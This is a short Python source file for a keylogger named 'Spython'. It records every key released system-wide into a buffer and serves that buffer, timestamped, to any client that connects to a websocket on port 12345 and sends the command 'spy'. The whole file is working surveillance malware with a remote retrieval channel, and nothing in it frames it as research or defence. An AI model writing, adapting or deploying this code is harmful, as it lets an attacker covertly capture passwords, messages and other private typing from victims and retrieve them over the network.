import keyboard
import websockets
import asyncio
import datetime as dt

class Spython:
    log_buffer: str

    def __init__(self):
        self.log_buffer = ''
        self.commands_mapper = {
            'spy': self.spy_reaction
        }
        keyboard.on_release(callback = self.key_release_reaction)
        asyncio.run(self.init_server())

    def key_release_reaction(self, event):
        to_add = event.name
        if to_add == 'space':
            to_add = ' '
        self.log_buffer += to_add
    
    async def init_server(self):
        serving_port = 12345
        async with websockets.serve(
            self.callback_server,
            '',
            serving_port
        ):
            await asyncio.Future()
    
    async def callback_server(self, websocket):
        async for message in websocket:
            try:
                await self.commands_mapper[message](websocket),
            except Exception as e:
                websocket.send('Unknown command')

    async def spy_reaction(self, websocket):
        timestamp = dt.datetime.now()
        await websocket.send(f"{timestamp}: {self.log_buffer}")
        self.log_buffer = ''

if __name__ == '__main__':
    spython = Spython()
